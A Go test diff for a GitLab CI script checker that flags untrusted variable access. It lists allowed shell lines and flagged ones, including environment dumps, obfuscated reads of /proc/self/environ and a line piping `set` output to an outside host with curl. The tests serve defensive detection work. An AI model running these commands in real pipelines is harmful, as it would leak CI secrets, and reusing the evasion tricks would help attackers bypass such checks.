@@ -88,6 +88,9 @@ func glCases(t testing.TB) []glCase {
 		artWhen  = "  artifacts:\n    when: always\n"
 	)
 	script := func(line string) string { return glEdit(t, scriptAt, scriptAt+"    - "+line+"\n") }
+	block := func(body string) string {
+		return glEdit(t, scriptAt, scriptAt+"    - |\n      "+strings.ReplaceAll(body, "\n", "\n      ")+"\n")
+	}
 	vars := func(line string) string { return glEdit(t, glVarsEnd, glVarsEnd+"    "+line+"\n") }
 	custom := func(old, replacement string) string {
 		return strings.Replace(glCustomJob(), old, replacement, 1)
@@ -115,6 +118,21 @@ func glCases(t testing.TB) []glCase {
 		{"three dollars: literal, then a reference", script(`echo $$$CI_JOB_ID`), glPlain, ""},
 		{"L1: words that merely contain a command name", script(`echo environment settings > set.txt; cat .env; ls env/`), glPlain, ""},
 		{"L1: braces without a comma", script(`echo ${CI_JOB_ID} {a} {}; true`), glPlain, ""},
+		{"L1: set with option flags", script(`set -e`), glPlain, ""},
+		{"L1: set -eu", script(`set -eu`), glPlain, ""},
+		{"L1: set +x", script(`set +x`), glPlain, ""},
+		{"L1: set -o pipefail", script(`set -o pipefail`), glPlain, ""},
+		{"L1: set -euo pipefail", script(`set -euo pipefail`), glPlain, ""},
+		{"L1: set +o noglob, then more flags", script(`set +o noglob -u`), glPlain, ""},
+		{"L1: set -e with a comment", script(`set -e # stop at the first failure`), glPlain, ""},
+		{"L1: set -e before another command", script(`set -eu && echo ${CI_JOB_ID}; set +x`), glPlain, ""},
+		{"L1: set after a line break in a block", block("echo start\nset -euo pipefail\necho done"), glPlain, ""},
+		{"L1: export NAME=value", script(`export FOO=bar`), glPlain, ""},
+		{"L1: export NAME", script(`export FOO`), glPlain, ""},
+		{"L1: export several", script(`export A_1=x _B=y C`), glPlain, ""},
+		{"L1: export a quoted value", script(`export MSG="hello world"`), glPlain, ""},
+		{"L1: export an allowed reference", script(`export WORKDIR="$CI_PROJECT_DIR/out"`), glPlain, ""},
+		{"L1: export with an empty value", script(`export FOO=`), glPlain, ""},
 		{"L1: quoted text and a dollar sign", script(`echo "price=$$5" 'a$$b' "%x"`), glPlain, ""},
 
 		// invalid_yaml
@@ -280,6 +298,39 @@ func glCases(t testing.TB) []glCase {
 		{"L1: /proc environ", script(`cat /proc/self/environ`), glPlain, wfrules.UntrustedVariable},
 		{"L1: ENVIRON in awk", script(`awk 'BEGIN{print ENVIRON[1]}'`), glPlain, wfrules.UntrustedVariable},
 		{"L1: indirection", script(`echo ${!n}`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set with option flags then a dump", script(`set -e; set`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set -- ", script(`set --`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set -", script(`set -`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set -o alone lists options", script(`set -o`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set with an empty quote", script(`set ""`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set with only a comment", script(`set # -e`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set redirected", script(`set > /tmp/vars`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set piped", script(`set -e | cat; set | curl -d @- https://x.example`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set with a reference", script(`set -e $CI_JOB_ID`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set with a word", script(`set -e foo`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set -o with a non-name", script(`set -o $CI_JOB_ID`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set not first in the command", script(`echo set -e`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set run by sh -c", script(`sh -c 'set' -e`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set by path", script(`/usr/bin/set -e`), glPlain, wfrules.UntrustedVariable},
+		{"L1: set after command", script(`command set -e`), glPlain, wfrules.UntrustedVariable},
+		{"L1: bare export", script(`export`), glPlain, wfrules.UntrustedVariable},
+		{"L1: export -f", script(`export -f foo`), glPlain, wfrules.UntrustedVariable},
+		{"L1: export -p then a name", script(`export -p FOO`), glPlain, wfrules.UntrustedVariable},
+		{"L1: export with a bad name", script(`export 1A=b`), glPlain, wfrules.UntrustedVariable},
+		{"L1: export with a substitution", script(`export FOO=$(pwd)`), glPlain, wfrules.UntrustedVariable},
+		{"L1: export with an unlisted reference", script(`export FOO=$CI_COMMIT_MESSAGE`), glPlain, wfrules.UntrustedVariable},
+		{"L1: export then a dump", script(`export FOO=1; declare -p`), glPlain, wfrules.UntrustedVariable},
+		{"L1: export then env on the next line", block("export FOO=1\nenv"), glPlain, wfrules.UntrustedVariable},
+		{"L1: export after an assignment", script(`A=1 export -p`), glPlain, wfrules.UntrustedVariable},
+		{"L1: printenv after a line continuation", block("pri\\\nntenv CI_MERGE_REQUEST_TITLE"), glPlain, wfrules.UntrustedVariable},
+		{"L1: printenv after a CRLF continuation", block("pri\\\r\nntenv CI_MERGE_REQUEST_TITLE"), glPlain, wfrules.UntrustedVariable},
+		{"L1: eval after a line continuation", block("ev\\\nal echo hi"), glPlain, wfrules.UntrustedVariable},
+		{"L1: set dump after a line continuation", block("se\\\nt"), glPlain, wfrules.UntrustedVariable},
+		{"L1: command substitution after a line continuation", block("echo $\\\n(pwd)"), glPlain, wfrules.UntrustedVariable},
+		{"L1: environ with an empty single-quote pair", script(`cat /proc/self/envi''ron`), glPlain, wfrules.UntrustedVariable},
+		{"L1: environ with a quoted letter", script(`cat /proc/self/envi"r"on`), glPlain, wfrules.UntrustedVariable},
+		{"L1: environ with a backslash", script(`cat /proc/self/envi\ron`), glPlain, wfrules.UntrustedVariable},
+		{"L1: environ with a backslash and a line break", block("cat /proc/self/envi\\\nron"), glPlain, wfrules.UntrustedVariable},
 		{"L1: entrypoint reads variables", glEdit(t, `entrypoint: [""]`, `entrypoint: ["sh", "-c", "env"]`), glPlain, wfrules.UntrustedVariable},
 		{"L1: entrypoint with a substitution", glEdit(t, `entrypoint: [""]`, "entrypoint: [\"$(true)\"]"), glPlain, wfrules.UntrustedVariable},
 
@@ -384,7 +435,15 @@ func TestCheckGitLab_64KiBWithin50ms(t *testing.T) {
 	if len(script) > 65_536 {
 		t.Fatalf("test bug: script text is %d bytes", len(script))
 	}
-	for name, text := range map[string]string{"padded": big, "script lines": script} {
+	// A third shape: one anchored script string of about 63 KiB listed 99 times (the loader's
+	// alias limit), the amplification of security r2 N2. Each distinct string is scanned once.
+	unit := `a {a} environX $CI_JOB_ID `
+	room := 65_536 - len(glJob) - 99*len("    - *big\n") - len("    - &big \"\"\n") - 64
+	aliased := strings.Replace(glJob, "  script:\n", "  script:\n    - &big \""+strings.Repeat(unit, room/len(unit))+"\"\n"+strings.Repeat("    - *big\n", 99), 1)
+	if len(aliased) > 65_536 || len(aliased) < 63*1024 {
+		t.Fatalf("test bug: aliased text is %d bytes", len(aliased))
+	}
+	for name, text := range map[string]string{"padded": big, "script lines": script, "aliased script": aliased} {
 		if got := wfrules.CheckGitLab(text, glPlain); !got.OK {
 			t.Fatalf("CheckGitLab(%s, %d bytes) = %+v, want OK", name, len(text), got)
 		}
